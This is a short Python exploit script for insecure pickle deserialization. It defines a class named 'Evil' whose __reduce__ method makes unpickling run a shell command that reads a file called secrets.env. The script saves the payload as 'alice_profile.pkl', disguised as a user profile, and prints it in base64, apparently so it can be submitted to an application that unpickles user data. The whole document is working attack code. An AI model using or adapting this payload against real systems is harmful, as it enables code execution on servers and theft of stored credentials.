import pickle
import subprocess

class Evil:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "secrets.env"],))

# Pickle
malicious_pickle = pickle.dumps(Evil())

with open("alice_profile.pkl", "wb") as f:
    f.write(malicious_pickle)

import base64
print(base64.b64encode(malicious_pickle).decode())
